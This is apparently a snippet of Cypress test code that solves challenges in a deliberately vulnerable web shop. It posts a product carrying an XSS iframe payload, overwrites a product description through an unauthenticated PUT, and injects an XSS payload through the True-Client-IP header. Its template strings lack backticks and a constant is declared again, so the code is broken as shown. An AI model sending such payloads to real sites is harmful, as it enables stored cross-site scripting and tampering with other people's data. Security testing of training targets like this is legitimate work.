const response = await fetch( ${Cypress.config('baseUrl')}/api/Products, { method: 'POST', cache: 'no-cache', headers: { 'Content-type': 'application/json', Authorization: Bearer ${localStorage.getItem('token')} }, body: JSON.stringify({ name: 'RestXSS', description: '<iframe src="javascript:alert(xss)">', price: 47.11 }) } ) const response = await fetch( ${Cypress.config('baseUrl')}/api/Products/${tamperingProductId}, { method: 'PUT', cache: 'no-cache', headers: { 'Content-type': 'application/json' }, body: JSON.stringify({ description: <a href="${overwriteUrl}" target="_blank">More...</a> }) } ) const response = await fetch( ${Cypress.config('baseUrl')}/rest/saveLoginIp, { method: 'GET', cache: 'no-cache', headers: { Authorization: Bearer ${localStorage.getItem('token')}, 'True-Client-IP': '<iframe src="javascript:alert(xss)">' } } )